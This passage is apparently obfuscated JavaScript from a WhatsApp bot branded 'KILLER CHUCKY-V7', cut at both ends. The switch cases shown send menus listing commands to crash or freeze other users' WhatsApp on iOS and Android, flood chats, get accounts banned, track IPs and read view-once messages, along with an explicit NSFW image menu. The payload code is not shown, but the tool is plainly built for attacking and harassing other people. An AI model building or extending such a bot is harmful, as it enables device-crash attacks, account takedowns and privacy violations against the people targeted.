+ global.simbol + " ᴅᴇᴠɪᴄᴇɪɴꜰᴏ\n┃" + global.simbol + " ʙᴏᴛɪɴꜰᴏ\n" + global.line + " " + global.simbol + " funmenu\n┗━━━━━━━━━━━━━━━━\n> *BUG IN-PLACE*\n┏━━━━━━━━━━━━━━━━\n┃" + global.simbol + " fchat\n┃" + global.simbol + " zeus-bug\n┃" + global.simbol + " off-chat\n┃" + global.simbol + " slay-chat\n┃" + global.simbol + " bang-chat\n┃" + global.simbol + " blank-chat\n" + global.line + " " + global.simbol + " bug-now\n" + global.line + " " + global.simbol + " hit-now\n" + global.line + " " + global.simbol + " chucky-suprise\n" + global.line + " " + global.simbol + " freeze-chat\n┗━━━━━━━━━━━━━━━━━\n> *CHUCKY BANNER*\n┏━━━━━━━━━━━━━━━━━\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ1\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ2\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ3\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ4\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ5\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ6\n┗━━━━━━━━━━━━━━━━━\n> *IOS* *BUG* *MENU*\n┏━━━━━━━━━━━━━━━━━\n┃ " + global.simbol + " ios18\n┃ " + global.simbol + " ios17\n┃ " + global.simbol + " slay-ios\n┃ " + global.simbol + " off-ios\n┃ " + global.simbol + " bang-ios\n┃ " + global.simbol + " kingmarx\n┃ " + global.simbol + " frezze-ios\n┃ " + global.simbol + " blast-ios\n┃ " + global.simbol + " x-ios\n┗━━━━━━━━━━━━━━━━━\n> *ANDROID* *BUG* *MENU*\n┏━━━━━━━━━━━━━━━━━  \n┃ " + global.simbol + " xchristmas\n┃ " + global.simbol + " cripple-ui\n┃ " + global.simbol + " xui\n┃ " + global.simbol + " crash-ui\n┃ " + global.simbol + " crash-andriod\n┃ " + global.simbol + " kill-samsung\n┃ " + global.simbol + " christmas-crash\n┃ " + global.simbol + " santa-chucky\n┃ " + global.simbol + " hohoho\n┃ " + global.simbol + " flood\n┗━━━━━━━━━━━━━━━━━\n";
          const _0x5be97c = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            showAdAttribution: true,
            thumbnail: _0x4ff1b6,
            mediaType: 4,
            MediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x459a99 = {
            externalAdReply: _0x5be97c
          };
          const _0x3d7c6a = {
            video: _0x16b61d,
            caption: _0x368d49,
            gifPlayback: true,
            contextInfo: _0x459a99
          };
          let _0x3ef3aa = _0x3d7c6a;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x3ef3aa, {
            quoted: _0x21f0d9
          });
          try {
            let _0x7ec721 = _0x4d1a4f.readFileSync("./marx/menu.mp3");
            const _0x5539c2 = {
              audio: _0x7ec721,
              mimetype: "audio/mpeg",
              ptt: true,
              caption: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x5539c2, {
              quoted: _0x21f0d9
            });
          } catch (_0x300d9a) {
            console.error("Failed to send audio:", _0x300d9a);
          }
        }
        break;
      case "allmenu":
        {
          let _0x42dad0 = [_0x34a350, _0x1fa4e2];
          let _0x2144e1 = Math.floor(Math.random() * _0x42dad0.length);
          let _0x2bb763 = _0x42dad0[_0x2144e1];
          let _0x53cd68 = "\n━━━━━━━━━━━━━━━━\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕*\n━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n*WAGWAN* *" + _0x21f0d9.pushName + "*\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃Creator : Marx Alone\n┗━━━━━━━━━━━━━━━━\n> 𝙈𝙀𝙉𝙐  \n━━━━━━━━━━━━━━━━  \n> *OWNER MENU*\n┏━━━━━━━━━━━━━━━\n┃" + global.simbol + " ᴀᴅᴅᴘʀᴇᴍ\n┃" + global.simbol + " ᴅᴇʟᴘʀᴇᴍ\n┃" + global.simbol + " sᴇʟғ\n┃" + global.simbol + " ᴘᴜʙʟɪᴄ\n┃" + global.simbol + " ꜱᴇᴛᴘᴘɢᴄ\n┃" + global.simbol + " ʟᴇᴀᴠᴇɢᴄ\n┃" + global.simbol + " ꜱᴇᴛʙɪᴏ\n┃" + global.simbol + " ꜱᴇᴛᴘᴘ\n┃" + global.simbol + " ᴅᴇʟᴘᴘ\n┃" + global.simbol + " ʟɪꜱᴛʙʟᴏᴄᴋ\n┃" + global.simbol + " ʙʟᴏᴄᴋ\n┃" + global.simbol + " ᴜɴʙʟᴏᴄᴋ\n┃" + global.simbol + " ᴀᴅᴅ\n┃" + global.simbol + " ᴋɪᴄᴋ\n┃" + global.simbol + " ᴊᴏɪɴ\n┃" + global.simbol + " ꜱᴇᴛɢᴄɴᴀᴍᴇ\n┃" + global.simbol + " ʟɪɴᴋɢꜱ\n┃" + global.simbol + " ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ\n┃" + global.simbol + " ᴘʀᴏᴍᴏᴛᴇ\n┃" + global.simbol + " ᴅᴇᴍᴏᴛᴇ\n┃" + global.simbol + " ʜɪᴅᴇᴛᴀɢ\n┃" + global.simbol + " ᴅᴇᴠɪᴄᴇɪɴꜰᴏ\n┃" + global.simbol + " ʙᴏᴛɪɴꜰᴏ\n" + global.line + " " + global.simbol + " funmenu\n┗━━━━━━━━━━━━━━━━\n> *BUG IN-PLACE*\n┏━━━━━━━━━━━━━━━━\n┃" + global.simbol + " fchat\n┃" + global.simbol + " zeus-bug\n┃" + global.simbol + " off-chat\n┃" + global.simbol + " slay-chat\n┃" + global.simbol + " bang-chat\n┃" + global.simbol + " blank-chat\n" + global.line + " " + global.simbol + " bug-now\n" + global.line + " " + global.simbol + " hit-now\n" + global.line + " " + global.simbol + " chucky-suprise\n" + global.line + " " + global.simbol + " freeze-chat\n┗━━━━━━━━━━━━━━━━━\n> *CHUCKY BANNER*\n┏━━━━━━━━━━━━━━━━━\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ1\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ2\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ3\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ4\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ5\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ6\n┗━━━━━━━━━━━━━━━━━\n> *IOS* *BUG* *MENU*\n┏━━━━━━━━━━━━━━━━━\n┃ " + global.simbol + " ios18\n┃ " + global.simbol + " ios17\n┃ " + global.simbol + " slay-ios\n┃ " + global.simbol + " off-ios\n┃ " + global.simbol + " bang-ios\n┃ " + global.simbol + " kingmarx\n┃ " + global.simbol + " frezze-ios\n┃ " + global.simbol + " blast-ios\n┃ " + global.simbol + " x-ios\n┗━━━━━━━━━━━━━━━━━\n> *ANDROID* *BUG* *MENU*\n┏━━━━━━━━━━━━━━━━━  \n┃ " + global.simbol + " xchristmas\n┃ " + global.simbol + " cripple-ui\n┃ " + global.simbol + " xui\n┃ " + global.simbol + " crash-ui\n┃ " + global.simbol + " crash-andriod\n┃ " + global.simbol + " kill-samsung\n┃ " + global.simbol + " christmas-crash\n┃ " + global.simbol + " santa-chucky\n┃ " + global.simbol + " hohoho\n┃ " + global.simbol + " flood\n┗━━━━━━━━━━━━━━━━━\n" + global.line + " NSFW MENU\n┏━━━━━━━━━━━━━━━━\n┃" + global.simbol + " swimsuit\n┃" + global.simbol + " schoolswimsuit\n┃" + global.simbol + " anime\n┃" + global.simbol + " catgirl \n┃" + global.simbol + " wolfgirl\n┃" + global.simbol + " greenhair\n┃" + global.simbol + " erectnipples\n┃" + global.simbol + " nipples\n┃" + global.simbol + " headband\n┃" + global.simbol + " openshirt\n┃" + global.simbol + " spreadlegs\n┃" + global.simbol + " fateseries\n┃" + global.simbol + " breasthold\n┃" + global.simbol + " seethrough\n┃" + global.simbol + " spreadpussy\n┃" + global.simbol + " twintail\n┃" + global.simbol + " breast\n┃" + global.simbol + " skirt\n┃" + global.simbol + " uniform\n┃" + global.simbol + " foxgirl\n┃" + global.simbol + " underwear\n┃" + global.simbol + " dress\n┃" + global.simbol + " nude\n┃" + global.simbol + " kitsune\n┃" + global.simbol + " ponytail\n┃" + global.simbol + " bed\n┃" + global.simbol + " pinkhair\n┃" + global.simbol + " blonde\n┃" + global.simbol + " bikini\n┃" + global.simbol + " vampire\n┃" + global.simbol + " nobra\n┃" + global.simbol + " white\n┃" + global.simbol + " barefoot\n┃" + global.simbol + " tougamecghou\n┃" + global.simbol + " hololive\n┃" + global.simbol + " uncensored\n┃" + global.simbol + " sunglasses\n┃" + global.simbol + " glasses\n┃" + global.simbol + " weapon\n┃" + global.simbol + " shirtlift\n┃" + global.simbol + " chain\n┃" + global.simbol + " fingering\n┃" + global.simbol + " anusview\n┃" + global.simbol + " headphone\n┃" + global.simbol + " headdress\n┃" + global.simbol + " bondage\n┃" + global.simbol + " pantypull\n┃" + global.simbol + " toplless\n┃" + global.simbol + " bunnygir\n┃" + global.simbol + " bunnyear\n┃" + global.simbol + " kusonime\n" + global.end + "\n\n" + global.line + " FUN MENU\n┏━━━━━━━━━━━━━━━━\n┃" + global.simbol + " YTPLAY\n┃" + global.simbol + " PLAY\n┃" + global.simbol + " ANILIST\n┃" + global.simbol + " ANIMEINFO\n┃" + global.simbol + " KITSUNE\n┃" + global.simbol + " GTGUIDE\n┃" + global.simbol + " ENC\n┃" + global.simbol + " INTCHIO-SEARCH\n┃" + global.simbol + " SPOTIFY\n┃" + global.simbol + " TELESTICKER\n┃" + global.simbol + " TOIMAGE\n┃" + global.simbol + " TOAUDIO\n┃" + global.simbol + " REMOVEBG\n┃" + global.simbol + " HD\n┃" + global.simbol + " TOURL\n┃" + global.simbol + " SSWEB\n┃" + global.simbol + " TRACKIP\n┃" + global.simbol + " WAIFU\n┃" + global.simbol + " FAKETWEET\n┃" + global.simbol + " TXT2IMG\n┃" + global.simbol + " RVO\n┃" + global.simbol + " READVIEWONCE\n┃" + global.simbol + " TOVN\n" + global.end + "\n";
          const _0x4889b8 = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            showAdAttribution: true,
            thumbnail: _0x2bb763,
            mediaType: 4,
            MediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x314c54 = {
            externalAdReply: _0x4889b8
          };
          const _0x3160c5 = {
            video: _0x16b61d,
            caption: _0x53cd68,
            gifPlayback: true,
            contextInfo: _0x314c54
          };
          let _0x5c6884 = _0x3160c5;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x5c6884, {
            quoted: _0x21f0d9
          });
          try {
            let _0x4d8925 = _0x4d1a4f.readFileSync("./marx/menu.mp3");
            const _0x5e9aab = {
              audio: _0x4d8925,
              mimetype: "audio/mpeg",
              ptt: true,
              caption: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x5e9aab, {
              quoted: _0x21f0d9
            });
          } catch (_0x475af1) {
            console.error("Failed to send audio:", _0x475af1);
          }
        }
        break;
      case "nsfwmenu":
        {
          let _0x2cbe54 = [_0x34a350, _0x1fa4e2];
          let _0x315a13 = Math.floor(Math.random() * _0x2cbe54.length);
          let _0x460331 = _0x2cbe54[_0x315a13];
          let _0x2e4efc = "\n━━━━━━━━━━━━━━━━\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕*\n━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n*WAGWAN* *" + _0x21f0d9.pushName + "*\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃Creator : Marx Alone\n┗━━━━━━━━━━━━━━━━\n" + global.line + " NSFW MENU\n┏━━━━━━━━━━━━━━━━\n┃" + global.simbol + " swimsuit\n┃" + global.simbol + " schoolswimsuit\n┃" + global.simbol + " anime\n┃" + global.simbol + " catgirl \n┃" + global.simbol + " wolfgirl\n┃" + global.simbol + " greenhair\n┃" + global.simbol + " erectnipples\n┃" + global.simbol + " nipples\n┃" + global.simbol + " headband\n┃" + global.simbol + " openshirt\n┃" + global.simbol + " spreadlegs\n┃" + global.simbol + " fateseries\n┃" + global.simbol + " breasthold\n┃" + global.simbol + " seethrough\n┃" + global.simbol + " spreadpussy\n┃" + global.simbol + " twintail\n┃" + global.simbol + " breast\n┃" + global.simbol + " skirt\n┃" + global.simbol + " uniform\n┃" + global.simbol + " foxgirl\n┃" + global.simbol + " underwear\n┃" + global.simbol + " dress\n┃" + global.simbol + " nude\n┃" + global.simbol + " kitsune\n┃" + global.simbol + " ponytail\n┃" + global.simbol + " bed\n┃" + global.simbol + " pinkhair\n┃" + global.simbol + " blonde\n┃" + global.simbol + " bikini\n┃" + global.simbol + " vampire\n┃" + global.simbol + " nobra\n┃" + global.simbol + " white\n┃" + global.simbol + " barefoot\n┃" + global.simbol + " tougamecghou\n┃" + global.simbol + " hololive\n┃" + global.simbol + " uncensored\n┃" + global.simbol + " sunglasses\n┃" + global.simbol + " glasses\n┃" + global.simbol + " weapon\n┃" + global.simbol + " shirtlift\n┃" + global.simbol + " chain\n┃" + global.simbol + " fingering\n┃" + global.simbol + " anusview\n┃" + global.simbol + " headphone\n┃" + global.simbol + " headdress\n┃" + global.simbol + " bondage\n┃" + global.simbol + " pantypull\n┃" + global.simbol + " toplless\n┃" + global.simbol + " bunnygir\n┃" + global.simbol + " bunnyear\n┃" + global.simbol + " kusonime\n" + global.end + "\n\n";
          const _0x4ba8c4 = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            showAdAttribution: true,
            thumbnail: _0x460331,
            mediaType: 4,
            MediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x41c1e0 = {
            externalAdReply: _0x4ba8c4
          };
          const _0x2f93a9 = {
            video: _0x16b61d,
            caption: _0x2e4efc,
            gifPlayback: true,
            contextInfo: _0x41c1e0
          };
          let _0x8f25d9 = _0x2f93a9;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x8f25d9, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "funmenu":
        {
          let _0x152205 = [_0x34a350, _0x1fa4e2];
          let _0x23477d = Math.floor(Math.random() * _0x152205.length);
          let _0x3aaa16 = _0x152205[_0x23477d];
          let _0x3b311a = "\n━━━━━━━━━━━━━━━━\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕*\n━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n*WAGWAN* *" + _0x21f0d9.pushName + "*\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃Creator : Marx Alone\n┗━━━━━━━━━━━━━━━━\n" + global.line + " FUN MENU\n┏━━━━━━━━━━━━━━━━\n┃" + global.simbol + " YTPLAY\n┃" + global.simbol + " PLAY\n┃" + global.simbol + " ANILIST\n┃" + global.simbol + " ANIMEINFO\n┃" + global.simbol + " KITSUNE\n┃" + global.simbol + " GTGUIDE\n┃" + global.simbol + " ENC\n┃" + global.simbol + " INTCHIO-SEARCH\n┃" + global.simbol + " SPOTIFY\n┃" + global.simbol + " TELESTICKER\n┃" + global.simbol + " TOIMAGE\n┃" + global.simbol + " TOAUDIO\n┃" + global.simbol + " REMOVEBG\n┃" + global.simbol + " HD\n┃" + global.simbol + " TOURL\n┃" + global.simbol + " SSWEB\n┃" + global.simbol + " TRACKIP\n┃" + global.simbol + " WAIFU\n┃" + global.simbol + " FAKETWEET\n┃" + global.simbol + " TXT2IMG\n┃" + global.simbol + " RVO\n┃" + global.simbol + " READVIEWONCE\n┃" + global.simbol + " TOVN\n┃" + global.simbol + " RPS\n┃" + global.simbol + " FLIP\n┃" + global.simbol + " TRIVIA\n┃" + global.simbol + " PIN-SEARCH\n" + global.end + "\n\n";
          const _0x1327c9 = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            showAdAttribution: true,
            thumbnail: _0x3aaa16,
            mediaType: 4,
            MediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x22c8dc = {
            externalAdReply: _0x1327c9
          };
          const _0x427896 = {
            video: _0x16b61d,
            caption: _0x3b311a,
            gifPlayback: true,
            contextInfo: _0x22c8dc
          };
          let _0x5a94de = _0x427896;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x5a94de, {
            quoted: _0x21f0d9
          });
        }
        break;
      case "bugmenu":
        {
          let _0x50ccb4 = [_0x34a350, _0x1fa4e2];
          let _0x19273e = Math.floor(Math.random() * _0x50ccb4.length);
          let _0x1ab322 = _0x50ccb4[_0x19273e];
          let _0xc0aa11 = "\n━━━━━━━━━━━━━━━━\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕*\n━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n*WAGWAN* *" + _0x21f0d9.pushName + "*\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃ 𝚁𝚄𝙽𝚃𝙸𝙼𝙴  : " + _0x26fa88(process.uptime()) + "\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃Creator : Marx Alone\n┗━━━━━━━━━━━━━━━━\n┏━━━━━━━━━━━━━━━━\n┃" + global.simbol + " fchat\n┃" + global.simbol + " zeus-bug\n┃" + global.simbol + " off-chat\n┃" + global.simbol + " slay-chat\n┃" + global.simbol + " bang-chat\n┃" + global.simbol + " blank-chat\n" + global.line + " " + global.simbol + " bug-now\n" + global.line + " " + global.simbol + " hit-now\n" + global.line + " " + global.simbol + " chucky-suprise\n" + global.line + " " + global.simbol + " freeze-chat\n┗━━━━━━━━━━━━━━━━━\n> *CHUCKY BANNER*\n┏━━━━━━━━━━━━━━━━━\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ1\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ2\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ3\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ4\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ5\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ6\n┗━━━━━━━━━━━━━━━━━\n> *IOS* *BUG* *MENU*\n┏━━━━━━━━━━━━━━━━━\n┃ " + global.simbol + " ios18\n┃ " + global.simbol + " ios17\n┃ " + global.simbol + " slay-ios\n┃ " + global.simbol + " off-ios\n┃ " + global.simbol + " bang-ios\n┃ " + global.simbol + " kingmarx\n┃ " + global.simbol + " frezze-ios\n┃ " + global.simbol + " blast-ios\n┃ " + global.simbol + " x-ios\n┗━━━━━━━━━━━━━━━━━\n> *ANDROID* *BUG* *MENU*\n┏━━━━━━━━━━━━━━━━━  \n┃ " + global.simbol + " xchristmas\n┃ " + global.simbol + " cripple-ui\n┃ " + global.simbol + " xui\n┃ " + global.simbol + " crash-ui\n┃ " + global.simbol + " crash-andriod\n┃ " + global.simbol + " kill-samsung\n┃ " + global.simbol + " christmas-crash\n┃ " + global.simbol + " santa-chucky\n┃ " + global.simbol + " hohoho\n┃ " + global.simbol + " flood\n┗━━━━━━━━━━━━━━━━━\n";
          const _0x4477e4 = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            showAdAttribution: true,
            thumbnail: _0x1ab322,
            mediaType: 4,
            MediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x54e216 = {
            externalAdReply: _0x4477e4
          };
          const _0x4f95a6 = {
            video: _0x16b61d,
            caption: _0xc0aa11,
            gifPlayback: true,
            contextInfo: _0x54e216
          };
          let _0x40777a = _0x4f95a6;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x40777a, {
            quoted: _0x21f0d9
          });
          try {
            let _0x3dfc1e = _0x4d1a4f.readFileSync("./marx/menu.mp3");
            const _0x189ab6 = {
              audio: _0x3dfc1e,
              mimetype: "audio/mpeg",
              ptt: true,
              caption: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x189ab6, {
              quoted: _0x21f0d9
            });
          } catch (_0x505d57) {
            console.error("Failed to send audio:", _0x505d57);
          }
        }
        break;
      case "imengggggggu":
        {
          let _0x30859e = [_0x34a350, _0x1fa4e2];
          let _0x22ed69 = Math.floor(Math.random() * _0x30859e.length);
          let _0x6fe8ff = _0x30859e[_0x22ed69];
          let _0x11f756 = "\n━━━━━━━━━━━━━━━━\n*𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕*\n━━━━━━━━━━━━━━━━\n*WAGWAN* *" + _0x21f0d9.pushName + "*\n━━━━━━━━━━━━━━━━\n> 𝙄𝙊𝙎 𝙈𝙀𝙉𝙐    \n> *OWNER MENU*\n┏━━━━━━━━━━━━━━━\n┃" + global.simbol + " ᴀᴅᴅᴘʀᴇᴍ\n┃" + global.simbol + " ᴅᴇʟᴘʀᴇᴍ\n┃" + global.simbol + " sᴇʟғ\n┃" + global.simbol + " ᴘᴜʙʟɪᴄ\n┃" + global.simbol + "ꜱᴇᴛᴘᴘɢᴄ\n┃" + global.simbol + "ʟᴇᴀᴠᴇɢᴄ\n┃" + global.simbol + "ꜱᴇᴛʙɪᴏ\n┃" + global.simbol + "ꜱᴇᴛᴘᴘ\n┃" + global.simbol + "ᴅᴇʟᴘᴘ\n┃" + global.simbol + "ʟɪꜱᴛʙʟᴏᴄᴋ\n┃" + global.simbol + "ʙʟᴏᴄᴋ\n┃" + global.simbol + "ᴜɴʙʟᴏᴄᴋ\n┃" + global.simbol + "ᴀᴅᴅ\n┃" + global.simbol + "ᴋɪᴄᴋ\n┃" + global.simbol + "ᴊᴏɪɴ\n┃" + global.simbol + "ꜱᴇᴛɢᴄɴᴀᴍᴇ\n┃" + global.simbol + "ʟɪɴᴋɢꜱ\n┃" + global.simbol + "ʀᴇꜱᴇᴛʟɪɴᴋɢᴄ\n┃" + global.simbol + "ᴘʀᴏᴍᴏᴛᴇ\n┃" + global.simbol + "ᴅᴇᴍᴏᴛᴇ\n┃" + global.simbol + "ʜɪᴅᴇᴛᴀɢ\n┃" + global.simbol + "ᴅᴇᴠɪᴄᴇɪɴꜰᴏ\n┃" + global.simbol + "ʙᴏᴛɪɴꜰᴏ\n┗━━━━━━━━━━━━━━━━\n> *CHUCKY* *UNBANNER*\n┏━━━━━━━━━━━━━━━━\n┃" + global.simbol + "ᴜɴʙᴀɴ-ᴡᴀ1\n┃" + global.simbol + "ᴜɴʙᴀɴ-ᴡᴀ2\n┃" + global.simbol + "ᴜɴʙᴀɴ-ᴡᴀ3\n┃" + global.simbol + "ᴜɴʙᴀɴ-ᴡᴀ3\n┃" + global.simbol + "ᴜɴʙᴀɴ-ᴡᴀ4\n┃" + global.simbol + "ᴜɴʙᴀɴ-ᴡᴀ6\n┗━━━━━━━━━━━━━━━━━\n> *CHUCKY BANNER*\n┏━━━━━━━━━━━━━━━━━\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ1\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ2\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ3\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ4\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ5\n┃" + global.simbol + "ʙᴀɴ-ᴡᴀ6\n┗━━━━━━━━━━━━━━━━━\n> *IOS* *BUG* *MENU*\n┏━━━━━━━━━━━━━━━━━\n┃ " + global.simbol + " ɪᴏs-ʜᴀʀᴅ\n┃ " + global.simbol + " ɪᴏs-ʙᴏᴏᴍ\n┃ " + global.simbol + " ɪᴏs-ɴᴜʟʟ\n┃ " + global.simbol + " ɪᴏs-ᴄʀᴀsʜ\n┃ " + global.simbol + " ɪᴏs-ʙʟᴀsᴛ\n┃ " + global.simbol + " ɪᴏs-ʙᴇᴛᴀ\n┃ " + global.simbol + " ɪᴏs-ғᴀʟʟ\n┃ " + global.simbol + " ɪᴏs-ᴍᴀʀx\n┃ " + global.simbol + "  ɪᴏs-ʙʟᴀɴᴋ\n┗━━━━━━━━━━━━━━━━━\n> *ANDROID* *BUG* *MENU*\n┏━━━━━━━━━━━━━━━━━  \n┃ " + global.simbol + " ʜɪᴛᴛ \n┃ " + global.simbol + " ᴇɴᴅ-ᴡᴀ  \n┃ " + global.simbol + " ᴋɪʟʟɪᴏs \n┃ " + global.simbol + " sʟᴀʏ\n┃ " + global.simbol + " sᴛʀɪᴋᴇ\n┃ " + global.simbol + " ᴡɪᴘᴇ-ᴏᴜᴛ \n┃ " + global.simbol + " ᴛᴀᴋᴇ-ᴅᴏᴡɴ\n┃ " + global.simbol + " ᴛᴀᴋᴇ-ᴏᴜᴛ\n┃ " + global.simbol + " ʙʟᴀsᴛ\n┃ " + global.simbol + " ᴇxɪʟᴇ\n┃ " + global.simbol + " ᴀssᴀᴜʟᴛ\n┃ " + global.simbol + " sɪʟᴇɴᴄᴇ\n┃ " + global.simbol + " ᴀssᴀssɪɴᴀᴛᴇ\n┃ " + global.simbol + " ᴄʀᴀsʜ-sʏs \n┃ " + global.simbol + " ʀᴇᴀᴘ\n┃ " + global.simbol + " ᴍᴀʀx-ᴄʀᴀsʜ\n┗━━━━━━━━━━━━━━━━━\n";
          const _0x4255b5 = {
            title: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕",
            body: "𝑴𝖆𝖗𝖝 𝕶𝖎𝖓𝖌",
            showAdAttribution: true,
            thumbnail: _0x6fe8ff,
            mediaType: 4,
            MediaUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s",
            sourceUrl: "https://whatsapp.com/channel/0029VajFEcFA89MlsCrxbD3s"
          };
          const _0x121d81 = {
            externalAdReply: _0x4255b5
          };
          const _0x17e1b6 = {
            image: _0x34a350,
            caption: _0x11f756,
            contextInfo: _0x121d81
          };
          let _0xe4c9ff = _0x17e1b6;
          await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0xe4c9ff, {
            quoted: _0x21f0d9
          });
          try {
            let _0x3402f1 = _0x4d1a4f.readFileSync("./marx/menu.mp3");
            const _0x2e3e68 = {
              audio: _0x3402f1,
              mimetype: "audio/mpeg",
              ptt: true,
              caption: "𝐊𝐈𝐋𝐋𝚵𝐑 𝐂𝐇𝐔𝐂𝐊𝐘-𝛁𝟕"
            };
            await _0x4b53e5.sendMessage(_0x21f0d9.chat, _0x2e3e68, {
              quoted: _0x21f0d9
            });
          } catch (_0x4f8d58) {
            console.error("Failed to send audio:", _0x4f8d58);
          }
        }
        break;
      case "button2":
        {
          if (!_0x3d405c) {
            return _0x3b9923(Testing);
          }
          console.log("Debugging 'm' object:", _0x21f0d9);
          let _0x597b72;
          if (_0x21f0d9.quoted) {
            _0x597b72 = _0x21f0d9.quoted;
            console.log("Quoted message found:", _0x597b72);
          } else if (_0x21f0d9.message) {
            _0x597b72 = _0x21f0d9.message;
            console.log("Using current message:", _0x597b72);
          } else {
            console.log("No valid message found for qpayment");
            _0x597b72 = undefined;
          }
          const _0x11f801 = {
            upload: _0x4b53e5.waUploadToServer
          };
          let _0x134d04 = await prepareWAMessageMedia({
            image: _0x4d1a4f.readFileSync("./marx/anjay.jpg")
          }, _0x11f801);
          const _0x1a459b = {
            hasMediaAttachment: true,
